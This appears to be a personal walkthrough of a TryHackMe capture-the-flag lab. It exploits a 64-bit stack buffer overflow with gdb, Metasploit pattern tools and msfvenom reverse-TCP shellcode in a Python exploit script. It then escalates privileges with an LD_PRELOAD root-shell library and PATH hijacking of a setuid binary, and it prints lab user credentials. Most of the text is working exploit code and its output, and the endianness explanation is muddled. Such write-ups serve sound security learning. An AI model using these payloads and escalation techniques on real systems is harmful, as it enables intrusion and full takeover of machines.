+0x7fffffffe22c: 0x00000000      0xffffe5a0      0x00007fff      0x55554848
+0x7fffffffe23c: 0x00005555      0x41414141      0x41414141      0x41414141
+0x7fffffffe24c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe25c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe26c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe27c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe28c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe29c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2ac: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2bc: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2cc: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2dc: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2ec: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2fc: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe30c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe31c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe32c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe33c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe34c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe35c: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe36c: 0x41414141      0x41414141      0x41414141      0x41414141
+
+# We decrement by 700 as the direction of the stack in address space, which you see in many pictures on better guides than this blog/walkthrough. by 700 because it large enough to see where the 1000 hex "A" are.
+
+# Consider memory as squarish chunk of space that is mapped by address:
+
+[ESP(extended stack pointer)            ] 
+[The progam has requested 600..         ] # The assign has been given that:
+[..bytes of space to hold user..        ] 
+[..input                                ]
+[                                       ]
+[            Buffer Space               ]
+[                                       ]
+[                                       ]
+[ c program terminates  ..              ]
+[..  char arrays, string with \0        ] # To here stack grows down to 
+[                                       ]
+[EBP(extended base pointer)             ]
+[EIP(extended instruction pointer)      ] <- Return address (THE NEXT PLACE TO GO!)
+
+
+[ESP(extended stack pointer)            ] 
+[414141414141414141414141414141414141414]
+[141414141414141414141414141414141414141]
+[41414141414 Buffer Space 14141414141414] # THE 'A' have done this!
+[414141414141414141414141414141414141414]
+[141414141414141414141414141414141414141]
+[ EBP 4141414141414141414141414141414414]
+[ EIP 1 Goodbye Return Address4141414414]
+
+# Next we need to make it easier to detirmine the extract place we need to then fill in the formula that looks currently like this:
+
+(python -c "print('\x90'*(fill in the number) + ('\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05') + 'A'*(fill in the number)+(return address))";cat) | ./bof64
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l
+# On tryhackme Attackboxes:
+/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb 
+
+(gdb) run
+Starting program: /home/des/bof 
+Enter some string:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+Program received signal SIGSEGV, Segmentation fault.
+0x000055555555484e in foo ()
+(gdb)
+(gdb) info register
+rax            0x0      0
+rbx            0x3e9    1001
+rcx            0x0      0
+rdx            0x0      0
+rsi            0x555555554956   93824992233814
+rdi            0x7ffff7dd0760   140737351845728
+rbp            0x4134754133754132       0x4134754133754132
+rsp            0x7fffffffe4a8   0x7fffffffe4a8
+r8             0xffffffffffffffed       -19
+r9             0x25e    606
+r10            0x5555557564cb   93824994337995
+r11            0x555555554956   93824992233814
+r12            0x3e9    1001
+r13            0x7fffffffe5a0   140737488348576
+r14            0x0      0
+r15            0x0      0
+rip            0x55555555484e   0x55555555484e <foo+84>
+eflags         0x10202  [ IF RF ]
+cs             0x33     51
+ss             0x2b     43
+ds             0x0      0
+es             0x0      0
+fs             0x0      0
+gs             0x0      0
+(gdb) x/100 $rsp
+0x7fffffffe4a8: 1967207797      930431286       1094219073      1983986037
+0x7fffffffe4b8: 829833520       1093826113      1983984502      896942388
+0x7fffffffe4c8: 1094088257      1983985526      964051256       1093695297
+0x7fffffffe4d8: 2000761207      863453490       1093957441      2000762231
+0x7fffffffe4e8: 930562358       1094219585      2017540471      829964592
+0x7fffffffe4f8: 1093826625      2017538936      897073460       1094088769
+0x7fffffffe508: 2017539960      964182328       1093695809      2034315641
+0x7fffffffe518: 863584562       1093957953      2034316665      930693430
+0x7fffffffe528: 1094220097      2051094905      830095664       1093827137
+0x7fffffffe538: 2051093370      897204532       1094089281      2051094394
+0x7fffffffe548: 964313400       1110466882      1631727969      862011954
+0x7fffffffe558: 1110729026      1631728993      929120822       1110991170
+0x7fffffffe568: 1648507233      828523056       1110598210      1648505698
+0x7fffffffe578: 895631924       1110860354      1648506722      962740792
+0x7fffffffe588: 1110467394      1665282403      862143026       1110729538
+0x7fffffffe598: 1665283427      929251894       1110991682      1682061667
+0x7fffffffe5a8: 828654128       1110598722      1682060132      895762996
+0x7fffffffe5b8: 1110860866      1682061156      962871864       1110467906
+0x7fffffffe5c8: 1698836837      862274098       1110730050      1698837861
+0x7fffffffe5d8: 929382966       1110992194      1715616101      828785200
+0x7fffffffe5e8: 1110599234      1715614566      895894068       1110861378
+0x7fffffffe5f8: 1715615590      963002936       1110468418      1732391271
+0x7fffffffe608: 862405170       1110730562      1732392295      929514038
+0x7fffffffe618: 1110992706      1749170535      828916272       1110599746
+0x7fffffffe628: -4351   32767   -4332   32767
+(gdb) x/100 $rsp-700
+0x7fffffffe1ec: 32767   18      0       -136509600
+0x7fffffffe1fc: 32767   1431652660      21845   -140096670
+0x7fffffffe20c: 32767   -140603160      32767   1001
+0x7fffffffe21c: 0       -7008   32767   1001
+0x7fffffffe22c: 0       -6752   32767   1431652424
+0x7fffffffe23c: 21845   1093689665      1631662433      862011698
+0x7fffffffe24c: 1093951809      1631663457      929120566       1094213953
+0x7fffffffe25c: 1648441697      828522800       1093820993      1648440162
+0x7fffffffe26c: 895631668       1094083137      1648441186      962740536
+0x7fffffffe27c: 1093690177      1665216867      862142770       1093952321
+0x7fffffffe28c: 1665217891      929251638       1094214465      1681996131
+0x7fffffffe29c: 828653872       1093821505      1681994596      895762740
+0x7fffffffe2ac: 1094083649      1681995620      962871608       1093690689
+0x7fffffffe2bc: 1698771301      862273842       1093952833      1698772325
+0x7fffffffe2cc: 929382710       1094214977      1715550565      828784944
+0x7fffffffe2dc: 1093822017      1715549030      895893812       1094084161
+0x7fffffffe2ec: 1715550054      963002680       1093691201      1732325735
+0x7fffffffe2fc: 862404914       1093953345      1732326759      929513782
+0x7fffffffe30c: 1094215489      1749104999      828916016       1093822529
+0x7fffffffe31c: 1749103464      896024884       1094084673      1749104488
+0x7fffffffe32c: 963133752       1093691713      1765880169      862535986
+0x7fffffffe33c: 1093953857      1765881193      929644854       1094216001
+0x7fffffffe34c: 1782659433      829047088       1093823041      1782657898
+0x7fffffffe35c: 896155956       1094085185      1782658922      963264824
+0x7fffffffe36c: 1093692225      1799434603      862667058       1093954369
+
+
+ALOT of hex but TL,DR:
+# The base pointer contains
+rbp            0x4134754133754132
+remove 0x and:
+
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 4134754133754132
+On tryhackme Attackboxes:
+/opt/metasploit-framework-5101/tools/exploit/pattern_offset.rb -l 1000 -q 4134754133754132
+
+root@ip-10-10-24-147:~# /opt/metasploit-framework-5101/tools/exploit/pattern_offset.rb -l 1000 -q 4134754133754132
+[*] Exact match at offset 608
+
+# FUZZ for blacklisted chars with 
+
+# For shell use msfvenom: # -b is blacklisted characters -f for your scripting language
+msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -b \x00 -f 
+
+Framework Executable Formats [--format <value>]
+===============================================
+
+    Name
+    ----
+    asp
+    aspx
+    aspx-exe
+    axis2
+    dll
+    elf
+    elf-so
+    exe
+    exe-only
+    exe-service
+    exe-small
+    hta-psh
+    jar
+    jsp
+    loop-vbs
+    macho
+    msi
+    msi-nouac
+    osx-app
+    psh
+    psh-cmd
+    psh-net
+    psh-reflection
+    python-reflection
+    vba
+    vba-exe
+    vba-psh
+    vbs
+    war
+
+
+To improve my go-app I use python as well notes
+
+root@ip-10-10-24-147:~# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.24.147 LPORT=1337 -b \x00 -f python
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No badchars present in payload, skipping automatic encoding
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of python file: 373 bytes
+buf =  b""
+buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
+buf += b"\x97\x48\xb9\x02\x00\x05\x39\x0a\x0a\x18\x93\x51\x48"
+buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
+buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
+buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
+buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
+
+
+from struct import pack
+
+nop = '\x90'
+
+buf =  b""
+buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
+buf += b"\x97\x48\xb9\x02\x00\x05\x39\x0a\x0a\x18\x93\x51\x48"
+buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
+buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
+buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
+buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
+
+offset = 608
+payloadSize = offset + 8
+rip = 0x7fffffffe2fc
+nopSled = 300* nop
+bufSize = len(buf)
+nopSize = len(nopSled)
+padding = 'A' * (payloadSize - bufSize - nopSize)
+payload = nopSled + buf + padding + pack("<Q", rip)
+
+print(payload)
+
+
+
+# ENDIANESS IS KEY TO UNDERSTANDING THAT the most significant bit 
+
+
+IF each 0 below you consider as 8 bits 8*8 = 64 for 64 bit arch(architecture of the cpu)
+
+LITTLE ENDIAN           8 8 8 8 8 8 8 8  <<THIS SIDE IS MOST IMPORTANT
+                        ^LSB       MSB^    
+
+
+BIG ENDIAN      THIS SIDE IS THE MOST IMPORTANT >> 8 8 8 8 8 8 8 8
+                                                   ^MSB       LSB^
+
+uid=1000(kel) gid=1001(des) groups=1001(des)
+cat /home/kel/flag.txt
+You flag is THM{************}
+
+The user credential
+username: kel
+password: kelvin_74656d7065726174757265
+
+## PATH variable Priv Esc
+
+## ssh or su to kel
+
+## PATH can be found with env or 
+## echo $PATH
+
+kel@THM_exploit:/home/des$ env
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+SSH_CONNECTION=10.10.24.147 58318 10.10.228.189 22
+LESSCLOSE=/usr/bin/lesspipe %s %s
+LANG=en_US.UTF-8
+XDG_SESSION_ID=1
+USER=kel
+PWD=/home/des
+HOME=/home/kel
+SSH_CLIENT=10.10.24.147 58318 22
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+SSH_TTY=/dev/pts/0
+MAIL=/var/mail/kel
+SHELL=/bin/bash
+TERM=xterm
+SHLVL=2
+LOGNAME=kel
+XDG_RUNTIME_DIR=/run/user/1001
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games 
+LESSOPEN=| /usr/bin/lesspipe %s
+_=/usr/bin/env
+
+From the tryhackme room https://tryhackme.com/room/linprivesc
+
+"
+    What folders are located under $PATH
+    Does your current user have write privileges for any of these folders?
+    Can you modify $PATH?
+    Is there a script/application you can start that will be affected by this vulnerability?
+"
+
+# Similar to 
+# Sudo-l LD_PRELOAD
+# if LD_PRELOAD appears in output
+# create .c -> compile 
+# gcc:(gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles);
+# {
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+# }
+# then 
+# This set the LD_PRELOAD to the path of a shared object, which
+# will be loaded before any other library (including C runtime, libc.so  
+# sudo LD_PRELOAD=/tmp/x.so [/some/bin/or/prog]
+
+# kel has executable called exe in /home/kel
+
+#include <unistd.h>
+
+void main()
+{
+        setuid(0);
+        setgid(0);
+        system("ps");
+}
+kel@THM_exploit:~$ ./exe
+  PID TTY          TIME CMD
+ 1623 pts/0    00:00:00 su
+ 1683 pts/0    00:00:00 exe
+ 1684 pts/0    00:00:00 sh
+ 1685 pts/0    00:00:00 ps
+kel@THM_exploit:~$ id
+uid=1000(kel) gid=1000(kel) groups=1000(kel),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
+
+# Running the exe with just run ps as 0, which is root uid number so change:
+ps->bash some how that is how the PATH variable comes in. We can't change the code and recompile it:
+as:
+-rwsr-xr-x 1 root root 8392 Jan 17  2020 exe
+-rw-r--r-- 1 root root   76 Jan 17  2020 exe.c # Is read only
+
+# The command used is ps and when system() calls are made they search the PATH variable of the user whom ran the executable.
+
+# Copy a precompile shell binary into world writable /tmp naming it ps like in the command:
+kel@THM_exploit:~$ cp /bin/sh /tmp/ps
+# change where PATH points to 
+kel@THM_exploit:~$ export PATH=/tmp:$PATH
+kel@THM_exploit:~$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+^^^^
+kel@THM_exploit:~$ ./exe
+# whoami
+root
+# 
